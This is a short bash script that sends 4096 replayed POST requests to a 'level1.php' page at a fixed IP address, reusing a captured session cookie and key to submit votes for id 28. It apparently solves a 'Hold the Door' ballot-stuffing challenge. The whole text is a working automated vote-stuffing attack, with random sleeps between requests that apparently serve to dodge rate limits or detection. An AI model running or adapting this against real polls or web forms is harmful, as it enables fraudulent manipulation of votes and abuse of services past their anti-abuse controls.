for ((i = 0; i < 4096; i++)); do curl 'http://54.221.6.249/level1.php' -H 'Host: 54.221.6.249' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:51.0) Gecko/20100101 Firefox/51.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Referer: http://54.221.6.249/level1.php' -H 'Cookie: PHPSESSID=s4l8it10ip9tv9dcb0qcl3iu82; HoldTheDoor=05958b4d2fe065203bdd9396df0c597e7c9309d3' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' --data 'id=28&holdthedoor=Submit+Query&key=05958b4d2fe065203bdd9396df0c597e7c9309d3' > /dev/null 2> /dev/null; sleep `./random_sleep`; done
